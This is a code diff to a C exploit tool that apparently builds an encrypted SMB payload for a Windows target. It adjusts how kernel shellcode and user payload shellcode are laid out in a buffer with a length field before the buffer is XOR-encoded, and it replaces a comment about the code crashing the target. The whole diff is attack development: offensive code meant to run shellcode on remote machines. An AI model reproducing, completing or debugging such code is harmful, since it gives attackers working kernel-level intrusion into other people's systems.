@@ -1,12 +1,6 @@
 #define _CRT_SECURE_NO_WARNINGS
 /*
-WARNING: This code works for me as of March 7th 2021 but it BSODS the target
-
-It could be because my kernel shellcode doesn't contain the payload shellcode length after it
-11/8/2021: Added code to attach the shellcode length after the kernel shellcode.
-
-To fix:
-Update SMB Length in NetBIOS header & make sure the payload shellcode length is being written to buffer correctly.
+WARNING: This code compiles but does not function yet
 */
 
 #include <windows.h>
@@ -328,33 +322,20 @@ int main(int argc, char* argv[])
 	//initialize to 0
 	memset((unsigned char*)encrypted, 0x00, 4096);
 
-	//copy kernel shellcode to encrypted buffer
-	memcpy((unsigned char*)encrypted, (char*)&kernel_shellcode, kernel_shellcode_size);
-
-	//add the payload shellcode length after the kernel shellcode
+	//calculate the payload shellcode length
 	DWORD dwPayloadShellcodeSize = sizeof(shellcode) / sizeof(shellcode[0]); //or statically put your own value here
 	
 	//remove the NULL terminator from the shellcode count
         dwPayloadShellcodeSize -= 1; 
+	
+	//copy kernel shellcode to encrypted buffer
+	memcpy((unsigned char*)encrypted, (char*)&kernel_shellcode, kernel_shellcode_size);
+	
+	//copy the shellcode size after the kernel shellcode
 	memcpy((unsigned char*)encrypted + kernel_shellcode_size, (char*)&dwPayloadShellcodeSize, 2);
 
-	//TO FIX:
-	//Shellcode is BSODing the target because the length of the payload shellcode is not added
-	//therefore it must be added...because of this it should contain code that adds the value
-	//Let's try this:
-	/*
-	DWORD DWsizeOfShellcode = sizeof(shellcode) / sizeof(shellcode[0]);
-	memcpy((unsigned char*)encrypted + kernel_shellcode_size, (char*)&DWsizeOfShellcode, 4);
-
-	//copy payload shellcode to encrypted buffer at the APPROPRIATE location ( +4 after kernel shellcode size )
-	memcpy((unsigned char*)encrypted + kernel_shellcode_size + 4, shellcode, payload_shellcode_size);
-	*/
-	/*
-	Because of this, the buffer holding the kernel and user shellcode must be extended by +4 to accomodate the DWORD value.
-	*/
-
 	//copy payload shellcode to encrypted buffer
-	memcpy((unsigned char*)encrypted + kernel_shellcode_size + 4, (char*)&shellcode, payload_shellcode_size);
+	memcpy((unsigned char*)encrypted + kernel_shellcode_size + 2, (char*)&shellcode, payload_shellcode_size);
 
 	//Xor the data buffer with the calculated key
 	xor_payload(XorKey, (unsigned char*)encrypted, 4096);
